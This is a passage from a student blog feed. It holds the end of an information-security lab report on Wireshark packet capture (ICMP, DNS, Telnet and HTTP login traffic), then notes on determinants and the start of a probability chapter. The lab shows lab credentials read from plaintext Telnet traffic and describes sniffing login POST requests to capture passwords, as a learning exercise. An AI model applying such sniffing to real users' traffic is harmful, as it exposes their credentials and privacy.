Protocol）是TCP&#x2F;IP协议族中的一个协议，用于在IP网络上发送控制消息。它通常用于报告错误情况、诊断网络问题以及提供有关网络的状态信息。</p><p>从图2.1中Ping命令发送了4个数据包，接受到了4个数据包，所以一共有8个数据包，图2.2所示也是8个数据包，抓包结果正确。之后分析源地址和目的地址，发送包是从我方主机发送到对方主机，所以从第一个数据包中可以看出，我方主机的IP地址是192.168.43.108，目的主机IP是61.135.169.121。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_2_GSWIQp5CfN.png"></p><p>图2.3  <code>ICMP</code>请求包</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_3_mz0xHNnAxO.png"></p><p>图2.4  ICMP回复包</p><p>点开一个ICMP请求包和一个ICMP回复包，分别如图2.3和图2.4所示，数据包中各个字段的说明如下：</p><p>表2.1  ICMP数据包字段含义说明</p><table><thead><tr><th>字段名&#xA;</th><th>字段含义&#xA;</th></tr></thead><tbody><tr><td>Type&#xA;</td><td>ICMP报文类型，8为请求报文，0为回答报文&#xA;</td></tr><tr><td>Code&#xA;</td><td>ICMP消息类型细分的子类型&#xA;</td></tr><tr><td>Checksum&#xA;</td><td>从ICMP头部到数据部分结束的校验和&#xA;</td></tr><tr><td>Identifier&#xA;</td><td>由主机设定，一般设置为进程号&#xA;</td></tr><tr><td>Sequence Number&#xA;</td><td>序列号，由主机设定，一般设为由0递增的序列&#xA;</td></tr><tr><td>Data&#xA;</td><td>ICMP数据，回送响应消息与回送消息中data保持一致&#xA;</td></tr></tbody></table><h2 id="2-2-DNS分析"><a href="#2-2-DNS分析" class="headerlink" title="2.2 DNS分析"></a>2.2 DNS分析</h2><p>DNS（Domain Name System，域名系统）是互联网中用于将域名（如example.com）映射到IP地址（如192.0.2.1）的分布式命名系统。它可以使用户可以通过易记的域名来访问网站、发送电子邮件等，而无需记住复杂的IP地址。</p><p>如图2.5所示，在<code>CMD</code>命令行中使用<code>nslookup</code>命令进行<code>DNS</code>解析，查询<code>www.baidu.com</code>对应的IP地址。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_4_KfkrSjs9iy.png"></p><p>图2.5  nslookup命令查询</p><p>如图2.6所示，第一个数据包和第二个数据包是刚打开nslookup时进行的初始化查询，由于没有进行任何查询，所以可以看到回复包中的数据是“No such name PTR 1.43.168.192.in-addr.arpa”。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_5_6-5REl_48n.png"></p><p>图2.6  DNS请求服务</p><p>之后的数据包就是对<a href="http://www.baidu.com/" title="www.baidu.com">www.baidu.com</a>进行域名查询的过程，点开其中的一个DNS请求包，如图2.7所示。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_6_oj-4bp4Kmy.png"></p><p>图2.7  DNS请求数据包</p><p>其中，Flag表示这是一个DNS查询数据包，其中的Queries字段体现了要查询的域名，这里要查询的域名是www.baidu.com。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_7_sfEbQif6dt.png"></p><p>图2.8  DNS回复数据包</p><p>从图2.6中可以看出，当主机将DNS查询发送给DNS服务器192.168.43.1后，DNS服务器直接将查询结果返回给了查询主机，之后主机就得到百度域名解析后的IP地址，结果为220.181.38.149和220.181.38.150。</p><p>实际中DNS的查询过程有递归查询和迭代查询两种，在递归查询中，DNS客户端向本地DNS服务器发送一个完整的查询请求，并要求DNS服务器负责解析整个查询过程，直到找到所需的域名解析结果。</p><p>在迭代查询中，DNS客户端向DNS服务器发送一个查询请求，DNS服务器只负责返回一个指向下一级DNS服务器的指针（迭代的下一步），而不负责解析整个查询过程。</p><h2 id="2-3-Telnet数据分析"><a href="#2-3-Telnet数据分析" class="headerlink" title="2.3 Telnet数据分析"></a>2.3 Telnet数据分析</h2><p>Telnet是一种基于文本的互联网标准通信协议，用于在两台计算机之间进行双向交互式通信。它最初是为远程登录而设计的，允许用户从本地计算机连接到远程主机并在其上运行命令。Telnet协议是一种明文传输，基于TCP协议进行。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_8_QtmVxUqMU_.png"></p><p>图2.9  Telnet服务数据包</p><p>使用Telnet过程中抓包如图2.9所示，首先分析一下主机的IP地址，由于Telnet协议使用TCP协议，所以需要先建立TCP连接，因此图2.9中第一条发出TCP建立连接请求的源主机应为目标主机IP地址，即192.168.3.6。</p><p>在传输过程中，用户输入的每一个数据被传输了两次，在分析数据包的过程，应该将数据进行去重，传输的数据流如图2.10所示。</p><p>去掉重复字符之后可以得到Telnet登录的用户名是“msfadmin”，密码为“msfadmin”。登录成功之后，图2.10中可以看出用户输入了ipconfig命令，但是在Telnet中没有ipconfig命令，所以报错。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_9_aKfbcdkxcN.png"></p><p>图2.10  Telnet协议追踪流</p><h2 id="2-4-登录过程抓包分析密码"><a href="#2-4-登录过程抓包分析密码" class="headerlink" title="2.4 登录过程抓包分析密码"></a>2.4 登录过程抓包分析密码</h2><p>在用户登录网站的过程中，通常是通过Post请求来实现的，并且用户需要在表单中输入用户名和密码，所以在向服务器发出Post请求的过程中，可以抓包，来获取管理员登录的账号和密码。</p><p>如图2.11和图2.12所示，客户端向服务器发出的基于HTTP协议的Post请求，红色框中的数据包的Info字段显示是用户登录操作，打开该数据包分析data字段，可以看到用户登录的“email”和“password”，这里的密码是通过加密后的数据，所以不是那么直观，但是我们仍然可以通过抓包行为来捕获到用户的行为，并对其进行分析，来得到一些用户个人隐私。</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_10_yCYiSGPurG.png"></p><p>图2.11  Post数据包分析</p><p><img src="/2024/06/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8F%96%E4%B8%8E%E5%88%86%E6%9E%90/image_11_1IyuuzVNEL.png"></p><p>图2.12  追踪Post请求HTTP流分析</p><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><p>完成本次实验后，我深入了解了网络抓包分析的过程，并掌握了使用Wireshark这一强大工具进行流量分析的技能。以下是我的心得体会：</p><ol><li>理解网络协议和数据包结构：在抓取和分析数据包之前，学习了不同网络协议的工作原理以及数据包的结构。这包括了ICMP、DNS、Telnet等协议的基本概念，以及它们在数据包中的具体格式和字段含义。</li><li>熟悉Wireshark的使用：Wireshark是一款功能强大的网络抓包工具，通过实验，我学会了如何使用Wireshark进行数据包捕获、过滤和分析，以及如何利用其强大的统计和图形化功能进行网络故障排除和性能优化。</li><li>注意隐私和安全：在分析抓取的数据包时，我时刻牢记网络安全和隐私保护的重要性。尤其是涉及到用户敏感信息（如用户名、密码等）的数据包分析。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数第1章：行列式</title>
      <link href="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/"/>
      <url>/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-二阶与三阶行列式"><a href="#1-二阶与三阶行列式" class="headerlink" title="1 二阶与三阶行列式"></a>1 二阶与三阶行列式</h1><h2 id="1-1-二阶行列式"><a href="#1-1-二阶行列式" class="headerlink" title="1.1 二阶行列式"></a>1.1 二阶行列式</h2><p><strong>定义</strong>：由四个数排成二行二列（横排称行、竖排称列）的数表$\begin{array}{ll}a_{11} &amp; a_{12} \ a_{21} &amp; a_{22}\end{array}$，表达式$a_{11} a_{22}-a_{12} a_{21}$称为上述数表确定的二阶行列式，并记作$\left|\begin{array}{ll}a_{11} &amp; a_{12} \ a_{21} &amp; a_{22}\end{array}\right|$。</p><p>$$<br>D&#x3D;\left|\begin{array}{ll}a_{11} &amp; a_{12} \ a_{21} &amp; a_{22}\end{array}\right|&#x3D;a_{11} a_{22}-a_{12} a_{21}<br>$$</p><p>计算规则：对角线法则</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_sQuVuvlyJU.png"></p><h2 id="1-2-三阶行列式"><a href="#1-2-三阶行列式" class="headerlink" title="1.2 三阶行列式"></a>1.2 三阶行列式</h2><p><strong>定义</strong>：设有9个数排成3行3列的数表</p><p>$$<br>\begin{array}{lll}a_{11} &amp; a_{12} &amp; a_{13} \ a_{21} &amp; a_{22} &amp; a_{23} \ a_{31} &amp; a_{32} &amp; a_{33}\end{array}<br>$$</p><p>同时按以下规则进行计算：</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_TMQDAOswfk.png"></p><p>（6）式称为数表所确定的三阶行列式。</p><h3 id="1-2-1-对角线法则"><a href="#1-2-1-对角线法则" class="headerlink" title="1.2.1 对角线法则"></a>1.2.1 对角线法则</h3><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_rEbTa5OzOz.png"></p><ul><li>红线上三元素的乘积冠以正号，蓝线上三元素的乘积冠以负号。</li><li>对角线法则只适用于二阶与三阶行列式。</li></ul><hr><h1 id="2-全排列与其逆序数"><a href="#2-全排列与其逆序数" class="headerlink" title="2 全排列与其逆序数"></a>2 全排列与其逆序数</h1><h2 id="2-1-概念"><a href="#2-1-概念" class="headerlink" title="2.1 概念"></a>2.1 概念</h2><p><strong>定义</strong>：把n个不同的元素排成一列，叫做这n个元素的全排列（或排列）。n个不同的元素的所有排列的种数，通常用$P_{n}$表示。</p><h2 id="2-2-排列的逆序数"><a href="#2-2-排列的逆序数" class="headerlink" title="2.2 排列的逆序数"></a>2.2 排列的逆序数</h2><p>规定各元素之间有一个标准次序, n 个不同的自然数，规定由小到大为标准次序.</p><p><strong>定义</strong>：在一个排列$\left(i_{1} i_{2} \cdots i_{t} \cdots i_{s} \cdots i_{n}\right)$中，若数$i_{t}&gt;i_{s}$则称这两个数组成一个逆序.</p><p>一个排列中所有逆序的总数称为此排列的<strong>逆序数</strong>.</p><blockquote><p>例如，在排列32514中，排序的逆序数时0+1+0+3+1&#x3D;5</p></blockquote><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_g01lGY-uCE.png"></p><h2 id="2-3-排列的奇偶性"><a href="#2-3-排列的奇偶性" class="headerlink" title="2.3 排列的奇偶性"></a>2.3 排列的奇偶性</h2><ul><li>逆序数为奇数的排列称为奇排列；</li><li>逆序数为偶数的排列称为偶排列；</li></ul><h2 id="2-4-计算排列逆序数的方法"><a href="#2-4-计算排列逆序数的方法" class="headerlink" title="2.4 计算排列逆序数的方法"></a>2.4 计算排列逆序数的方法</h2><p>分别计算出排在$1,2, \cdots, n-1, n$前面比它大的数码之和即分别算出$1,2, \cdots, n-1, n$这n个元素的逆序数，这个元素的逆序数的总和即为所求排列的逆序数.</p><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><ol><li>n个不同的元素的所有排列种数为$n!$</li><li>排列具有奇偶性</li><li>计算排列逆序数常用的方法有2种</li></ol><hr><h1 id="3-n阶行列式"><a href="#3-n阶行列式" class="headerlink" title="3 n阶行列式"></a>3 n阶行列式</h1><h2 id="3-1-定义"><a href="#3-1-定义" class="headerlink" title="3.1 定义"></a>3.1 定义</h2><p><strong>定义</strong>：由n²个数组成的n阶行列式等于所有取自不同行不用列的n个元素的乘积的代数和$\sum(-1)^{t} a_{1 p_{1}} a_{2 p_{2}} \cdots a_{n p_{n}}$，记作：</p><p>$$<br>D&#x3D;\left|\begin{array}{cccc}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1 n} \ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2 n} \ \vdots &amp; \vdots &amp; &amp; \vdots \ a_{n 1} &amp; a_{n 2} &amp; \cdots &amp; a_{n n}\end{array}\right|<br>$$</p><p>简记作det(aij)，数aij称为行列式det(aij)的元素。</p><p>其中$p_{1} p_{2} \cdots p_{n}$为自然数1,2,…,n的一个排列，t为这个排列的逆序数。</p><p>$$<br>\begin{array}{l}D&#x3D;\left|\begin{array}{cccc}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1 n} \ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2 n} \ \cdots \cdots \cdots \cdots \ a_{n 1} &amp; a_{n 2} &amp; \cdots &amp; a_{n n}\end{array}\right| \ &#x3D;\sum_{p_{1} p_{2} \cdots p_{n}}(-1)^{t\left(p_{1} p_{2} \cdots p_{n}\right)} a_{1 p_{1}} a_{2 p_{2}} \cdots a_{n p_{n}}\end{array}<br>$$</p><h2 id="3-2-说明"><a href="#3-2-说明" class="headerlink" title="3.2 说明"></a>3.2 说明</h2><ol><li>行列式是一种特定的算式，它是根据求解方程个数和未知量个数相同的一次方程组的需要而定义的</li><li>n阶行列式是n!项的代数和</li><li>n阶行列式的每项都是位于不同行、不同列n个元素的乘积</li><li>一阶行列式|a|&#x3D;a不要与绝对值记号混淆</li><li>$a_{1 p_{1}} a_{2 p_{2}} \cdots a_{n p_{n}} 的符号为 (-1)^{t}$</li><li>主对角线以下（以上）的元素都为0的行列式叫做<strong>上（下）三角形行列式</strong></li><li>特别地，主对角线以下和以上的元素都为0的行列式叫做<strong>对角行列式</strong></li></ol><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><ol><li>行列式是一种特定的算式，它是根据求解方程个数和未知量个数相同的一次方程组的需要而定义的.</li><li>n阶行列式共有n!项，每项都是位于不同行、不同列的n个元素的乘积,正负号由下标排列的逆序数决定.</li></ol><hr><h1 id="4-对换"><a href="#4-对换" class="headerlink" title="4 对换"></a>4 对换</h1><h2 id="4-1-对换的定义"><a href="#4-1-对换的定义" class="headerlink" title="4.1 对换的定义"></a>4.1 对换的定义</h2><ul><li>在排列中，将任意两个元素对调，其余元素不动，这种作出新排列的手续叫做<strong>对换</strong>.</li><li>将相邻两个元素对调，叫做<strong>相邻对换</strong>．</li></ul><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_-WjbkvhQdT.png"></p><h2 id="4-2-对换与排列的奇偶性的关系"><a href="#4-2-对换与排列的奇偶性的关系" class="headerlink" title="4.2 对换与排列的奇偶性的关系"></a>4.2 对换与排列的奇偶性的关系</h2><p>一个排列中的任意两个元素对换，排列改变奇偶性。</p><ul><li>奇排列调成标准排列的对换次数为奇数</li><li>偶排列调成标准排列的对换次数为偶数</li></ul><hr><h1 id="5-行列式的性质"><a href="#5-行列式的性质" class="headerlink" title="5 行列式的性质"></a>5 行列式的性质</h1><h2 id="5-1-主要性质"><a href="#5-1-主要性质" class="headerlink" title="5.1 主要性质"></a>5.1 主要性质</h2><h3 id="5-1-1-性质1"><a href="#5-1-1-性质1" class="headerlink" title="5.1.1 性质1"></a>5.1.1 性质1</h3><p>记行列式$D^{T}$称为行列式D的转置行列式。</p><p>$$<br>\boldsymbol{D}&#x3D;\left|\begin{array}{cccc}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1 n} \ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2 n} \ \vdots &amp; &amp; \ddots &amp; \vdots \ a_{n 1} &amp; a_{n 2} &amp; \cdots &amp; a_{n n}\end{array}\right| \boldsymbol{D}^{T}&#x3D;\left|\begin{array}{cccc}a_{11} &amp; a_{21} &amp; \cdots &amp; a_{n 1} \ a_{12} &amp; a_{22} &amp; \cdots &amp; a_{n 2} \ \vdots &amp; &amp; \ddots &amp; \vdots \ a_{1 n} &amp; a_{2 n} &amp; \cdots &amp; a_{n n}\end{array}\right|<br>$$</p><p>性质1：行列式与它的转置行列式相等。</p><ul><li>行列式中行与列具有同等的地位,因此行列式的性质凡是对行成立的对列也同样成立.</li></ul><h3 id="5-1-2-性质2"><a href="#5-1-2-性质2" class="headerlink" title="5.1.2 性质2"></a>5.1.2 性质2</h3><ul><li>互换行列式的两行（列），行列式变号</li></ul><p><strong>证明</strong>：简单的想，交换两行，那么相当于选出的每个排列中都有两个元素的位置进行交换，那么这个排列的逆序数就会+1或-1，所以每个排列的结果都加一个负号，所以行列式变号。</p><p>推论：如果行列式有两行（列）完全相同，则此行列式为0。</p><h3 id="5-1-3-性质3"><a href="#5-1-3-性质3" class="headerlink" title="5.1.3 性质3"></a>5.1.3 性质3</h3><ul><li>行列式的某一行（列）中所有的元素都乘以同一数k，等于用数k乘此行列式</li></ul><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_Wd6FBggslZ.png"></p><p>推论：行列式的某一行（列）中所有元素的公因子可以提到行列式符号的外面。</p><h3 id="5-1-4-性质4"><a href="#5-1-4-性质4" class="headerlink" title="5.1.4 性质4"></a>5.1.4 性质4</h3><p>行列式中如果有两行（列）元素成比例，则此行列式为零。</p><h3 id="5-1-5-性质5"><a href="#5-1-5-性质5" class="headerlink" title="5.1.5 性质5"></a>5.1.5 性质5</h3><p>若行列式的某一列（行）的元素都是两数之和，例如</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_VeSB2gPkPI.png"></p><p>则D等于下列两个行列式之和：</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_vaefWRo_3_.png"></p><h3 id="5-1-6-性质6"><a href="#5-1-6-性质6" class="headerlink" title="5.1.6 性质6"></a>5.1.6 性质6</h3><p>把行列式的某一列（行）的各元素乘以同一数然后加到另一列（行）对应的元素上去，行列式不变。</p><h2 id="5-2-应用举例"><a href="#5-2-应用举例" class="headerlink" title="5.2 应用举例"></a>5.2 应用举例</h2><p>计算行列式常用方法：利用运算$r_{i}+{k} r_{j}$把行列式化为上三角形行列式，从而算得行列式的值。</p><hr><h1 id="6-行列式按行（列）展开"><a href="#6-行列式按行（列）展开" class="headerlink" title="6 行列式按行（列）展开"></a>6 行列式按行（列）展开</h1><p>一般来说，低阶行列式的计算比高阶行列式的计算要简便，因此可以考虑使用低阶行列式来表示高阶行列式的问题，为此，先引入余子式和代数余子式的概念。</p><h2 id="6-1-余子式和代数余子式"><a href="#6-1-余子式和代数余子式" class="headerlink" title="6.1 余子式和代数余子式"></a>6.1 余子式和代数余子式</h2><p>在 阶行列式中，把元素$a_{ij}$所在的第i行和第j列划去后，留下来的n-1阶行列式叫做元素$a_{ij}$的余子式，记作$M_{ij}$。</p><p>记$A_{i j}&#x3D;(-1)^{i+j} M_{i j}$，叫做元素$a_{ij}$的代数余子式。</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_TVfrXU2jyG.png"></p><p>行列式的每个元素分别对应一个余子式和一个代数余子式。</p><p>引理：一个n阶行列式，如果其中第i行所有元素除$a_{ij}$外都为零，那么这个行列式等于$a_{ij}$与它的代数余子式的乘积，即$D&#x3D;a_{i j} A_{i j}$。</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_NLn1L87CfL.png"></p><h2 id="6-2-行列式按行（列）展开法则"><a href="#6-2-行列式按行（列）展开法则" class="headerlink" title="6.2 行列式按行（列）展开法则"></a>6.2 行列式按行（列）展开法则</h2><p>定理3：行列式等于它的任一行（列）的各元素与其对应的代数余子式乘积之和，即</p><p>$$<br>D&#x3D;a_{i 1} A_{i 1}+a_{i 2} A_{i 2}+\cdots+a_{i n} A_{i n} \quad(i&#x3D;1,2, \cdots, n)<br>$$</p><blockquote><p>例：证明范德蒙德（<code>Vandermonde</code>）行列式</p></blockquote><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image.png"></p><p>证明：使用数学归纳法</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_XpeswFXB4V.png"></p><p>现在假设对于n-1阶范德蒙德行列式成立，要证明对于n阶范德蒙德行列式也成立。</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_rv8cDihWGP.png"></p><p>按第1列展开，并把每列的公因子$\left(x_{i}-x_{1}\right)$提出，就有</p><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_zHCVIf0pzi.png"></p><p>推论：行列式任一行（列）的元素与另一行（列）的对应元素的代数余子式乘积之和等于零，即</p><p>$$<br>a_{i 1} A_{j 1}+a_{i 2} A_{j 2}+\cdots+a_{i n} A_{j n}&#x3D;0, \quad i \neq j<br>$$</p><h2 id="6-3-关于代数余子式的重要性质"><a href="#6-3-关于代数余子式的重要性质" class="headerlink" title="6.3 关于代数余子式的重要性质"></a>6.3 关于代数余子式的重要性质</h2><p><img src="/2024/06/14/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E8%A1%8C%E5%88%97%E5%BC%8F/image_T2aTIxgNSc.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第6章：随机样本和抽样分布</title>
      <link href="/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/"/>
      <url>/2024/06/14/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC6%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E6%A0%B7%E6%9C%AC%E5%92%8C%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="1-随机样本"><a href="#1-随机样本" class="headerlink" title="1 随机样本"></a>1 随机样本</h1><h2 id="1-1-总体"><a href="#1-1-总体" class="headerlink" title="1.1 总体"></a>1.1 总体</h2><p>对有关对象的某一数量指标进行试验和观察，将试验的全部可能的观察值称为<strong>总体</strong>；</p><p>每一个可能的观察值称为<strong>个体</strong>，个体的数量称为总体的<strong>容量</strong>。</p><p>一个总体对应一个随机变量X；随机变量的分布函数和数字特征称为总体X的分布函数和数字特征。</p><h2 id="1-2-样本"><a href="#1-2-样本" class="headerlink" title="1.2 样本"></a>1.2 样本</h2><p>总体分布一般是未知的，或只知道是包含未知参数的分布。通过从总体中抽取一部分个体，根据获得的数据推断总体分布，这一抽取过程称为 “<strong>抽样</strong>”，所抽取的部分个体称为总体的一个样本. 样本中所包含的个体数目称为<strong>样本容量</strong>.</p><ul><li>从总体抽取一个个体：对总体X进行一次观察并记录结果。</li></ul><p><strong>定义</strong>：设X是具有分布函数F的随机变量，若$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是具有同一分布F的且相互独立的随机变量，则$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$为从总体X(总体F)得到的容量为n的简单随机样本，简称样本。</p><p>观察值$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$为样本值，又称为X的n个独立观察值。</p><p><strong>“简单随机抽样”特点</strong>：$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$相互独立且每一个与所考察的总体有相同的分布.</p><p>$\left(X_{1}, X_{2}, \ldots, X_{n}\right)$分布函数与联合概率密度函数满足：</p><ol><li>$F^{*}\left(x, x_{2}, \ldots, x_{n}\right)&#x3D;F\left(x_{1}\right) F\left(x_{2}\right) \ldots F\left(x_{n}\right)$</li><li>$f^*\left(x,x_2,\ldots,x_n\right)&#x3D;f\left(x_1\right)f\left(x_2\right)\ldots f\left(x_n\right)$</li></ol><hr><h1 id="2-抽样分布"><a href="#2-抽样分布" class="headerlink" title="2 抽样分布"></a>2 抽样分布</h1><h2 id="2-1-统计量与经验分布函数"><a href="#2-1-统计量与经验分布函数" class="headerlink" title="2.1 统计量与经验分布函数"></a>2.1 统计量与经验分布函数</h2><p><strong>定义</strong>：设$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$是来自总体X的一个样本，$g(X_{1}, X_{2}, \ldots, X_{\mathrm{n}})$是$X_{1}, X_{2}, \ldots, X_{\mathrm{n}}$的函数，若g中不含未知参数，则称$g(X_{1}, X_{2}, \ldots, X_{\mathrm{n}})$是一个<strong>统计量</strong>。</p><ul><li>$g\left(x_{1}, x_{2}, \cdots, x_{n}\right)$是统计量$g(X_{1}, X_{2}, \ldots, X_{\mathrm{n}})$的观察值。</li></ul><h3 id="2-1-1-几个常见的统计量"><a href="#2-1-1-几个常见的统计量" class="headerlink" title="2.1.1 几个常见的统计量"></a>2.1.1 几个常见的统计量</h3><h4 id="2-1-1-1-样本平均值"><a href="#2-1-1-1-样本平均值" class="headerlink" title="2.1.1.1 样本平均值"></a>2.1.1.1 样本平均值</h4><p>$$<br>\bar{X}&#x3D;\frac{1}{n} \sum_{i&#x3D;1}^{n} X_{i}<br>$$</p><h4 id="2-1-1-2-样本方差"><a href="#2-1-1-2-样本方差" class="headerlink" title="2.1.1.2 样本方差"></a>2.1.1.2 样本方差</h4><p>$$<br>S^{2}&#x3D;\frac{1}{n-1} \sum_{i&#x3D;1}^{n}\left(X_{i}-\bar{X}\right)^{2}&#x3D;\frac{1}{n-1}\left(\sum_{i&#x3D;1}^{n} X_{i}^{2}-n \bar{X}^{2}\right)<br>$$</p><h4 id="2-1-1-3-样本标准差"><a href="#2-1-1-3-样本标准差" class="headerlink" title="2.1.1.3 样本标准差"></a>2.1.1.3 样本标准差</h4><p>$$<br>S&#x3D;\sqrt{\frac{1}{n-1} \sum_{i&#x3D;1}^{n}\left(X_{i}-\bar{X}\right)^{2}}<br>$$</p><h4 id="2-1-1-4-样本k阶原点矩-xD"><a href="#2-1-1-4-样本k阶原点矩-xD" 